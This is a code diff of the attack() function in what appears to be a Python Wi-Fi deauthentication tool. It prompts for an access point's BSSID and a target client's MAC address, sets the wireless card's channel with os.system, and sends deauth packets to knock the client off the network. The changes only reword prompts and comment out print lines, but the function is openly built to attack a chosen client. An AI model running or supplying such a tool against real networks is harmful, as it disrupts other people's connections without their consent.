@@ -38,9 +38,9 @@ def attack():
         print("Press Ctrl-C to finish scanning for networks")
         pass
 
-    print("Dauth stage: ")
+    # print("Dauth stage: ")
     # Let the user input the MAC address of the router
-    BSSID = input('Please enter the BSSID/MAC address of the AP: ')
+    BSSID = input('\nChoose the BSSID/MAC address of the AP: ')
 
     print('Changing ' + wlan + ' to channel ' + str(known[BSSID][1]))
     os.system("iwconfig %s channel %d" % (wlan, known[BSSID][1]))
@@ -50,14 +50,15 @@ def attack():
     sniffClients(wlan, BSSID)
 
     brdMac = input(
-        'Please enter the BSSID/MAC address of the client you wish to attack: ')
+        '\nChoose the MAC address of the client you wish to attack: ')
 
     print('Sending deauth packets now, press ctrl+c to end the attack')
-    print('' * 2)
+    # print('' * 2)
 
     setTarget(brdMac, interface, BSSID)
 
-    print("DONE! Reverting monitor card back to managed mode :)")
+    print("\nDONE! Reverting monitor card back to managed mode :)")
+    
     setManagerMode(wlan)
 
 
